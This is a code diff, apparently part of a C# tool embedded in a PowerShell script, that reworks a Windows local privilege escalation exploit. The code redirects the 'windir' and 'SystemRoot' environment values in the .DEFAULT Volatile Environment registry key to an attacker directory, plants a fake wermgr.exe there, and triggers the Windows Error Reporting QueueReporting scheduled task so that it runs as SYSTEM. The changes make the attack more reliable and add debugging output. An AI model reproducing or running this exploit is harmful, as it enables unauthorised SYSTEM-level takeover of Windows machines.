@@ -254,30 +254,44 @@ if($r-eq 0){
         bool wrote = false;
         IntPtr hTK = OKey(TK, KEY_SET_VALUE);
         if (hTK!=IntPtr.Zero) {
-            var vn = new US("windir");
-            var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
-            wrote = NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0;
-            vn.Free(); NtClose(hTK);
+            /* Write both windir and SystemRoot - task might use either */
+            foreach (string vname in new[]{"windir","SystemRoot"}) {
+                var vn = new US(vname);
+                var wb = System.Text.Encoding.Unicode.GetBytes(runDir+"\0");
+                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true;
+                vn.Free();
+            }
+            NtClose(hTK);
         }
         if (!wrote) {
             try {
                 var rk = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment",true)
                       ?? Registry.Users.CreateSubKey(@".DEFAULT\Volatile Environment");
-                rk?.SetValue("windir",runDir); rk?.Close(); wrote=true;
+                rk?.SetValue("windir",runDir);
+                rk?.SetValue("SystemRoot",runDir);
+                rk?.Close(); wrote=true;
             } catch {}
         }
         if (!wrote){Console.WriteLine("[-] windir write failed");return false;}
-        Console.WriteLine($"[+] windir = {runDir}");
 
-        PreparePayload(runDir); /* copy self as fake wermgr.exe */
+        /* Verify we can read it back */
+        string verify = null;
+        try { verify = Registry.Users.OpenSubKey(@".DEFAULT\Volatile Environment")
+                ?.GetValue("windir") as string; } catch {}
+        Console.WriteLine($"[+] windir written={runDir}  readback={verify??"(null)"}");
 
+        PreparePayload(runDir);
+
+        /* Check the task exists and capture any trigger error */
         var psi = new System.Diagnostics.ProcessStartInfo("schtasks.exe",
             @"/run /tn ""\Microsoft\Windows\Windows Error Reporting\QueueReporting""")
-            {UseShellExecute=false,CreateNoWindow=true};
-        using(var p=System.Diagnostics.Process.Start(psi)) p.WaitForExit(3000);
-
-        /* Leave EVERYTHING intact - WER needs the fake windir in VE to find our wermgr.exe */
-        Console.WriteLine("[+] WER triggered, waiting for SYSTEM...");
+            {UseShellExecute=false,CreateNoWindow=false,RedirectStandardOutput=true,RedirectStandardError=true};
+        string taskOut = "";
+        using(var p=System.Diagnostics.Process.Start(psi)) {
+            taskOut = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+            p.WaitForExit(5000);
+        }
+        Console.WriteLine($"[+] schtasks: {taskOut.Trim()}");
         return true;
     }
 
